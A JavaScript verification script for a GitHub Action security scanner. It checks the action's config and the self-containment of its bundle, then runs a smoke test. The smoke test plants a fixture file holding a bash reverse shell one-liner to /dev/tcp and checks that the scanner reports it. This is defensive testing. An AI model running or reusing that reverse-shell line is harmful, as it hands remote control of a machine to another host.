// Checks the bundled action before it is committed:
//  1. action.yml runs dist/index.js on a supported Node runtime;
//  2. the bundle is self-contained: no unresolved @apps/@libs/@types/@utils alias and no
//     import of anything except Node built-ins (the runner has no node_modules);
//  3. smoke test: the bundle runs against a fixture repository, finds the planted reverse
//     shell, writes the SARIF file and fails the job, all without network access.
import { spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { builtinModules } from 'node:module';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const root = fileURLToPath(new URL('..', import.meta.url));
const bundle = path.join(root, 'dist', 'index.js');
const problems = [];

// ---- 1. action.yml ----------------------------------------------------------
const actionYml = readFileSync(path.join(root, 'action.yml'), 'utf8');
if (!/^\s+main:\s*['"]?dist\/index\.js['"]?\s*$/m.test(actionYml)) {
  problems.push('action.yml: runs.main must be dist/index.js');
}
if (!/^\s+using:\s*['"]?node2[4-9]['"]?\s*$/m.test(actionYml)) {
  problems.push('action.yml: runs.using must be node24 or newer');
}

// ---- 2. self-contained bundle --------------------------------------------
// Drop block comments first: bundled libraries carry JSDoc examples such as
// "import { Parser } from 'yaml'" that are documentation, not imports.
const code = readFileSync(bundle, 'utf8').replace(/\/\*[\s\S]*?\*\//g, '');
const builtins = new Set(builtinModules);
// Statement-level `import … from '…'` / `export … from '…'` at the start of a line, plus
// `import('…')` and `require('…')` calls. Strings that merely contain "from" are ignored.
const IMPORTS = [
  /^\s*(?:import|export)\s[^;'"]*?\bfrom\s*(['"])([^'"\n]+)\1/gm,
  /^\s*import\s*(['"])([^'"\n]+)\1/gm,
  /\b(?:import|require)\s*\(\s*(['"])([^'"\n]+)\1\s*\)/g,
];
for (const match of IMPORTS.flatMap((re) => [...code.matchAll(re)])) {
  const spec = match[2] ?? '';
  if (/^@(?:apps|libs|types|utils|tests)$/.test(spec)) {
    problems.push(`dist/index.js: unresolved alias "${spec}"`);
  } else if (!spec.startsWith('.') && !spec.startsWith('node:') && !builtins.has(spec)) {
    problems.push(`dist/index.js: external import "${spec}" (must be bundled)`);
  }
}

// ---- 3. smoke test --------------------------------------------------------
const tmp = mkdtempSync(path.join(os.tmpdir(), 'psg-verify-'));
try {
  const workspace = path.join(tmp, 'repo');
  mkdirSync(workspace);
  writeFileSync(
    path.join(workspace, 'evil.sh'),
    'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n',
  );
  writeFileSync(path.join(tmp, 'summary.md'), '');
  writeFileSync(path.join(tmp, 'output.txt'), '');

  const run = spawnSync(process.execPath, [bundle], {
    encoding: 'utf8',
    env: {
      'PATH': process.env.PATH,
      'GITHUB_WORKSPACE': workspace,
      'GITHUB_STEP_SUMMARY': path.join(tmp, 'summary.md'),
      'GITHUB_OUTPUT': path.join(tmp, 'output.txt'),
      'GITHUB_REPOSITORY': 'owner/repo',
      'INPUT_CHECKS': 'malware,workflows',
      'INPUT_FAIL-ON': 'high',
      'INPUT_SCOPE': 'auto',
      'INPUT_COMMENT': 'false',
      'INPUT_COMMENT-WHEN-CLEAN': 'false',
      'INPUT_OSV-SCANNER-VERSION': '2.7.0',
      'INPUT_GITLEAKS-VERSION': '8.30.1',
      'INPUT_SEMGREP-VERSION': '1.186.0',
    },
  });
  const summary = readFileSync(path.join(tmp, 'summary.md'), 'utf8');
  if (run.status !== 1)
    problems.push(
      `smoke test: expected exit code 1, got ${run.status}\n${run.stdout}${run.stderr}`,
    );
  if (!summary.includes('`evil.sh:1`'))
    problems.push('smoke test: reverse shell not reported in the job summary');
  try {
    readFileSync(path.join(workspace, 'polyglot-security-guard.sarif'), 'utf8');
  } catch {
    problems.push('smoke test: SARIF file was not written');
  }
} finally {
  rmSync(tmp, { recursive: true, force: true });
}

if (problems.length > 0) {
  console.error(problems.join('\n'));
  process.exitCode = 1;
} else {
  console.log('verify-dist: OK (self-contained bundle, smoke test passed)');
}
